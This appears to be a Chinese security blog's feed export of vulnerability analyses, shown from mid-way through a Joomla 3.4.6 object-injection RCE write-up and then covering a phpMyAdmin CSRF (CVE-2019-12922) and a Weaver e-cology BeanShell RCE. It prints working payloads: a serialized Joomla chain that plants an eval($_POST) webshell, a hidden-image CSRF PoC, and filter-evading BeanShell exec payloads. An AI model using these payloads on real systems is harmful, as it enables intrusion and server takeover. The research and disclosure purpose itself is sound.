于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), ‘init’]，传入call_user_func_array。 跟进init方法： 12345678910111213141516171819202122&lt;?phpfunction init() &#123; // Check absolute bare minimum requirements. if ((function_exists(&apos;version_compare&apos;) &amp;&amp; version_compare(PHP_VERSION, &apos;4.3.0&apos;, &apos;&lt;&apos;)) || !extension_loaded(&apos;xml&apos;) || !extension_loaded(&apos;pcre&apos;)) &#123; return false; &#125; ... if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null) &#123; $this-&gt;data = array(); $this-&gt;multifeed_objects = array(); $cache = false; if ($this-&gt;feed_url !== null) &#123; $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url); // Decide whether to enable caching if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;) &#123; $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;); 很明显，其中这两个call_user_func将是触发代码执行的元凶。 所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。 2.2 SimplePie类默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。P牛的Poc 1O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;ð 前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了选择用file_put_contents函数写入一句话到configuration.php中 1file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\\\&apos;test\\\&apos;])) eval($_POST[\\\&apos;test\\\&apos;]);\&apos;, FILE_APPEND) || $a=\&apos;http://wtf\&apos;; 最终的对象如下： 1AAA&quot;;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:217:&quot;file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\&apos;ja0k\&apos;]))+eval($_POST[\&apos;ja0k\&apos;]);&apos;,+FILE_APPEND)+||+$a=&apos;http://wtf&apos;;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;s:6:&quot;return&quot;;s:102: #修复建议更新至最新版本官方地址https://downloads.joomla.org 代码及工具下载：https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE 免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。 参考：[1].https://cxsecurity.com/issue/WLB-2019100045[2].https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html[3].https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA]]></content>
      <categories>
        <category>技术</category>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>漏洞分析</tag>
        <tag>对象注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞分析-CVE-2019-12922_phpMyAdmin小于等于4.9.0.1CSRF漏洞分析]]></title>
    <url>%2F2019%2F09%2F27%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91CVE-2019-12922-phpMyAdmin%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E4-9-0-1CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[最近安全圈曝光了很多漏洞，之前审计了泛微 OARCE 漏洞,今天审计分析phpMyAdmin_CSRF漏洞 #事件背景 2019年9月16日，网络上曝光phpMyAdmin4.9.0.1版本中存在跨站请求伪造漏洞，攻击者可利用该漏洞通过受影响客户端向服务器发送非预期的请求。这个漏洞影响phpMyAdmin的版本最高到4.9.0.1，这是phpMyAdmin目前最新的发行版本。因为这个漏洞危及的范围比较小，仅允许攻击者删除目标服务器里的，phpMyAdmin控制面板中关于setup页面中的服务器配置。攻击者所需要做的仅仅是发送一个精心设计的URL给网页的管理员，这个管理员需要在他的浏览器登录到phpMyAdmin控制面板，然后在同一个浏览器点击这个URL，就会不知不觉地删除了配置里的服务器。 #漏洞信息 漏洞名称 phpMyAdmin_CSRF漏洞 CVE编号 CVE-2019-12922 CNVD编号 CNVD-2019-31657 影响版本 phpMyAdmin &lt;=4.9.0.1（据说phpMyAdmin 5.0.0-alpha1版也存在） 威胁等级 中危 公开时间 2019年9月16日 #漏洞分析 1.什么是CSRF？ CSRF(Cross-site request forgery)跨站请求伪造，也被称为One ClickAttack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。 上图为CSRF攻击的一个简单模型：用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。 2.静态审计 漏洞存在于phpmyadmin/setup/index.php文件，该文件为安装phpmyadmin的脚本，可以在此脚本中创建连接新的Mysql数据库服务器 允许get请求参数为page， 再跟进到/setup/frames/$page.inc.php 也就是 /setup/frames/server.inc.php文件 这个php从Get请求获取了 mode和id这两个参数的值， mode有三种（’edit’、’remove’、’revert’） 当mode=remove且Servers/$id不为null时，使用removeServer方法删除server然后Location跳转到/phpmyadmin/setup/index.php首页 我们再跟进看下phpMyAdmin/libraries/config/ConfigFile.class.php的removeServer方法 unset这句是关键 unset函数是销毁指定变量，在这里就是删掉$server ```unset($_SESSION[$this-&gt;id][‘Servers’][$last_server]);``` 导致CSRF的根据原因为phpmyamdin，没有全局token，只有在登录/phpmyadmin/index.php后，才会创建token 所以在设置服务器页面phpmyadmin/setup/index.php是没有token的，故此无法防御跨站请求伪造攻击，这样$server就通过CSRF漏洞被删除了。 但是这个漏洞不能执行Sql语句拖库，故此危害等级不高，但是利用起来很简单，攻击者只需要知道服务器的URL，就能利用CSRF漏洞删除phpmyamdi配置中的服务器。 #漏洞复现 在浏览器打开 http://192.168.21.56/phpmyadmin/setup/index.php 为了方便后面CSRF漏洞能够成功删除服务器成功先New一个服务器 点击New server就跳转到服务器创建页面 save之后跳转到之前setup/index.php页面 可以看到这里Delete按钮就是 Poc中的地址，点击这个delete就能删除这个server 开始复现CSRF漏洞，构造Poc，新建一个CSRF.html文件写入以下代码 123&lt;p&gt;Deleting Server 1&lt;/p&gt;&lt;img src=&quot;http://192.168.31.56/phpmyadmin/setup/index.php?page=servers&amp;mode=remove&amp;id=1&quot;;style=&quot;display:none;&quot;/&gt; 在同一个浏览器中执行 通过抓包设置断点可以看到该请求 该请求删除了id为1的server 再返回/setup/index.php 查看发现之前新建的 id为1 ，name为11111的server被删除 本次分析复现的代码及POC会在本人的Github上分享https://github.com/securitycn/ #修复建议 厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.phpmyadmin.net/ #免责声明 本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。 #版权 本文为作者原创禁止一切非授权转载和抄袭行为，如需转载请联系在公众号后台留言（留言请说明来意），转载请注明出处及下方二维码。 #求关注 欢迎大家留言，喜欢文章的朋友可以关注本公众号 微信公众号：securitycn 博客：https://securitycn.github.io Github: https://github.com/securitycn]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>安全研究</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[泛微OA E-cology 远程代码执行漏洞分析、过滤器绕过及批量检测工具]]></title>
    <url>%2F2019%2F09%2F24%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E6%B3%9B%E5%BE%AEOA-E-cology-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%81%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E5%8F%8A%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[【漏洞分析】泛微OA E-cology 远程代码执行漏洞原理分析、过滤器绕过及批量检测工具 Author:Ja0k 最近曝光了很多漏洞，后续将对这些有代表性的漏洞进行分析审分析，今天有空先审计分析 泛微OA RCE 漏洞 #事件背景 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的JAVABeanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。 #漏洞信息 漏洞名称 泛微OA E-cology 远程代码执行漏洞 CVE编号 - CNVD编号 CNVD-2019-32204 影响版本 e-cology &lt;=9.0 威胁等级 高危 公开时间 2019年9月17日 #漏洞分析 此次存在漏洞的是JAVA Beanshell接口，现在了解下Beanshell的基础。 1. BeanShell 知识（来源：https://github.com/beanshell/beanshell） BeanShell是一个小型的，免费的，可嵌入的Java源解释器，具有使用Java编写的对象脚本语言功能。BeanShell动态执行标准Java语法，并通过通用的脚本编写便利进行扩展，例如松散的类型，命令和方法闭包（如Perl和JavaScript）。 可以交互地使用BeanShell进行Java实验和调试，以及以新方式扩展应用程序。 Beanshell可以执行print、dir、eval、exec等命令 页面如下图 2. 泛微中Beanshell库jar代码静态分析 从泛微里提取存在漏洞的lib文件 bsh-2.0b4.jar 反编译查看servlet.BshServlet这个类 在类中发现doGet和doPost方法，用来接收并执行提交的数据。 doPost实际上就是对doGet的二次封装 在doGet方法中看到调用evalScript方法创建一个名为obj的对象，再看evalScript这个方法中的pramString参数，最终会被interpreter.eval处理。如下图 跟进 bsh.Interpreter类的eval方法 跳转到bsh.classpath/ClassManagerImpl.class类 该类调用了bsh.commands/exec.bsh脚本，该脚本可以执行命令 #漏洞复现 泛微OA BeanShell复现测试 把print(“hello!”)换成exec(“whoami”)，就可以测试能否执行系统命令了。 Poc1: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw 如果有全局过滤器过滤了exec或eval，会有报错，如下图： 可以采用unicode编码、字符串拼接等方式绕过,见下图： Poc2: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw Poc3： bsh.script=eval%00(“ex”%2b”ec(bsh.httpServletRequest.getParameter(\“command\“))”);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami 2. 批量验证脚本 该脚本拼接了常用的泛微OA web路径，结合了本文讲解绕过过滤器的3个Poc 该工具仅用于测试研究使用请勿他用。 3.本文用到的文件下载地址 泛微OA中提取的Beanshell库： https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/bsh-2.0b4.jar 批量脚本： https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/Weaver-Ecology-OA_RCE-EXP.py #免责声明 本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>Web安全</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
</search>
